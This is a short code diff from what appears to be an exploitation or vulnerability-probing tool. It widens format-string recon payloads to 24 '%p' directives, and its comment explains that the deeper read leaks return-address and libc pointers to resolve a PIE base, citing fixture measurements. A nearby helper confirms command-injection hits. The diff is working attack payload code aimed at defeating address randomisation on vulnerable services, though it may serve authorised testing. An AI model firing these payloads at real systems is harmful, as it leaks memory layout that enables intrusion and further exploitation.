@@ -28,8 +28,18 @@ def cmdi_confirm(out: bytes, payload: str, marker: str) -> bool:
     return mk in out and (b"echo " + mk) not in out
 
 
+#: How many `%p` the recon payload asks for. Eight was the original width and it CONFIRMS the bug
+#: (two interpreted directives are proof enough) while resolving nothing: the pointers that anchor a
+#: base -- the saved return into the image, a libc pointer -- sit deeper than the eighth varargs
+#: slot. Measured on the format-string read fixture, 4 runs each: 8 and 12 directives proved a base
+#: 0/4, and 24 proved it 4/4, on both PIE and non-PIE. The short payload stays, and is tried after,
+#: for a sink whose buffer truncates the long one.
+_FMT_DEEP = 24
+
+
 def fmt_payloads(marker: str):
-    return [marker.encode() + b".%p.%p.%p.%p.%p.%p.%p.%p",
+    return [marker.encode() + b".%p" * _FMT_DEEP,
+            marker.encode() + b".%p.%p.%p.%p.%p.%p.%p.%p",
             marker.encode() + b"%x.%x.%x.%x.%x.%x.%x.%x"]
 
 
